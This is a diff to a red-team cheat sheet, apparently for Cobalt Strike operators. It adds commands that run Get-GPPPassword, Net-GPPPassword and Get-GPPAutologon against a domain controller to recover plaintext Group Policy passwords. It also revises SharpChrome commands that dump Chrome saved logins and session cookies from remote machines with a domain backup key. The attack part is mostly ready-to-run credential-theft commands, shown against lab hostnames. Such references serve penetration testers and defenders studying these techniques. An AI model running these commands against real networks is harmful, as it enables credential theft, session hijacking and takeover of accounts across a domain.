@@ -125,8 +125,23 @@ Aggressor script using execute-assembly, SharpMove and SharpRPD assemblies for d
 
 ------------------------------------------------------------------------------------------
 ## Domain Privilege Escalation
-### GPP Password
-[Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
+### GPP Passwords
+[Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) PowerSploit module
+```
+# Get-GPPPassword Searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords
+powershell-import --> Get-GPPPassword.ps1
+powerpick Get-GPPPassword -Server ops-dc01.lab.com
+```
+[Net-GPPPassword](https://github.com/outflanknl/Net-GPPPassword) .NET port of get-gpppassword
+```
+execute-assembly C:\Net-GPPPassword.exe lab.com
+```
+[Get-GPPAutologon](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) PowerSploit module
+```
+# Get-GPPAutologn searches the domain controller for registry.xml to find autologon information and returns the username and password
+powershell-import --> Get-GPPAutologon.ps1
+powerpick Get-GPPAutolgon
+```
 
 ### Password spraying
 [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)
@@ -193,11 +208,11 @@ execute-assembly SharpDPAPI.exe keepass /pvk:key.pvk /unprotect
 SharpChrome to extract and decrypt a user's Chrome sessions/passwords
 ```
 # Dumping Chrome login passwords on remote machines using the domain backup key (can also use local user password)
-execute-assembly SharpChrome.exe logins /pvk:key.pvk /server:SERVER.lab.local
+execute-assembly SharpChrome.exe logins /pvk:key.pvk /server:SERVER.lab.com
 
 # Dumping and decryptiong Chrome user cookies and sessions on remote machines using the domain backup key (can also use local user password)
 # Cookies can then be imported into Chrome/Firefox using the extension Cookie-Editor
-execute-assembly SharpChrome.exe cookies /pvk:key.pvk /server:SERVER.lab.local /format:json
+execute-assembly SharpChrome.exe cookies /pvk:key.pvk /server:SERVER.lab.com /format:json
 ```
 
 ### [SharpWeb](https://github.com/djhohnstein/SharpWeb) - Retrieve saved credentials in Chrome, Firefox and Edge
